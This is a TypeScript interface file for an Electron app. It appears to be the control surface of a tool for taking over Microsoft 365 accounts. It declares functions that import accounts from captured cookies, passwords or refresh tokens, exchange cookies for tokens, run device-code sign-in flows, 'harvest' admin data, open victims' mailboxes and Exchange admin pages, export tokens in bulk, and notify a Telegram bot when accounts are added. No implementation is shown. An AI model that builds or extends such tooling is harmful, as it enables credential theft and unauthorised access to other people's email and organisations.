export interface ElectronAPI {
  accounts: {
    addViaCredentials: (email: string, password: string) => Promise<unknown>;
    addViaCookies: (email: string, cookies: string) => Promise<unknown>;
    addViaToken: (
      email: string,
      clientId: string,
      authorityEndpoint: string,
      refreshToken: string,
      scopeType?: string
    ) => Promise<unknown>;
    delete: (accountId: string) => Promise<unknown>;
    deleteBulk: (ids: string[]) => Promise<unknown>;
    exportJSON: (accountId: string) => Promise<unknown>;
    exportBulkCSV: (ids: string[]) => Promise<unknown>;
    testLogin: (email: string, password: string) => Promise<unknown>;
  };
  platform: string;
  versions: {
    node: string;
    chrome: string;
    electron: string;
  };
  store: {
    get: (key: string) => Promise<any>;
    set: (key: string, value: any) => Promise<boolean>;
    delete: (key: string) => Promise<boolean>;
  };
  safeStorage: {
    encrypt: (plaintext: string) => Promise<string>;
    decrypt: (ciphertext: string) => Promise<string>;
  };
  api: {
    request: (options: {
      url: string;
      method?: string;
      headers?: Record<string, string>;
      body?: any;
      /** Main-process fetch timeout (default 15000, max 120000). */
      timeoutMs?: number;
    }) => Promise<{
      ok: boolean;
      status: number;
      headers: Record<string, string>;
      data: any;
    }>;
  };
  microsoft: {
    getAccessToken: (
      clientId: string,
      authority: string,
      refreshToken: string,
      scopeType?: string,
      resource?: string
    ) => Promise<any>;
    startDeviceCode: (clientId?: string, authority?: string) => Promise<any>;
    pollDeviceCode: (deviceCode: string, clientId?: string, authority?: string) => Promise<any>;
  };
  actions: {
    captureCookies: (url: string) => Promise<{ success: boolean; cookies?: string; message?: string }>;
    exchangeCookiesForToken: (
      cookies: string,
      email?: string,
      opts?: { clientId?: string; authority?: string; redirectUri?: string; showWindow?: boolean }
    ) => Promise<any>;
    adminHarvest: (accountId: string) => Promise<any[]>;
    openMailbox: (accountId: string) => Promise<{ success: boolean; error?: string }>;
    /** Panel root `/admin` (org mailboxes), not `/admin/mailbox/...`. */
    openPanelAdmin: (accountId: string) => Promise<{ success: boolean; error?: string }>;
    /** e.g. `admin/connectors`, `admin/smtp` — must be under the panel server origin. */
    openPanelPath: (accountId: string, relativePath: string) => Promise<{ success: boolean; error?: string }>;
    openOutlook: (
      accountId: string,
      options?: { mode?: 'owa' | 'exchangeAdmin'; authPreference?: 'token' | 'cookie' }
    ) => Promise<any>;
    openOwaExternalSignIn: (accountId: string) => Promise<{ success: true; opened: boolean } | { success: false; error?: string }>;
    telegramSendAlert: (bot: string, message: string) => Promise<{ success: boolean; error?: string }>;
    telegramSendSearchResults: (bot: string, results: any[]) => Promise<{ success: boolean; error?: string }>;
    telegramAccountsNotify: (email: string, via: string) => Promise<{ success: boolean; error?: string }>;
    telegramTest: (bot: string) => Promise<{ success: boolean; error?: string }>;
    importTokens: (filePath: string) => Promise<{ success: boolean; count?: number }>;
    exportTokens: (filePath: string) => Promise<{ success: boolean; path?: string }>;
    exportTokensWithDialog: () => Promise<{ success: boolean; path?: string; count?: number; canceled?: boolean; error?: string }>;
    clearActivity: () => Promise<{ success: boolean }>;
    testTokenExchange: (accountId: string) => Promise<any>;
    testDeviceCodeHighHopes: () => Promise<any>;
    addV2Token: (accountId: string, refreshToken: string, authorityEndpoint?: string, clientId?: string, resource?: string, scopeType?: string) => Promise<any>;
    removeV2Token: (accountId: string) => Promise<any>;
    getOutlookDebugLogs: () => Promise<{ success: boolean; text: string; lines: number }>;
    copyOutlookDebugLogs: () => Promise<{ success: boolean; lines: number; path: string }>;
  };
  oauth: {
    deviceCode: (clientId?: string, authority?: string) => Promise<any>;
    pollToken: (deviceCode: string, clientId?: string, authority?: string) => Promise<any>;
    deviceCodeHighHopes: () => Promise<any>;
  };
  browser: {
    open: (url: string) => Promise<void>;
    openPopup: (url: string) => Promise<void>;
    openLoginPage: (url: string) => Promise<void>;
  };
  files: {
    saveTextWithDialog: (opts: {
      defaultFilename: string;
      content: string;
      filters?: { name: string; extensions: string[] }[];
    }) => Promise<{ ok: true; path: string } | { ok: false }>;
  };
}

declare global {
  interface Window {
    electron: ElectronAPI;
  }
}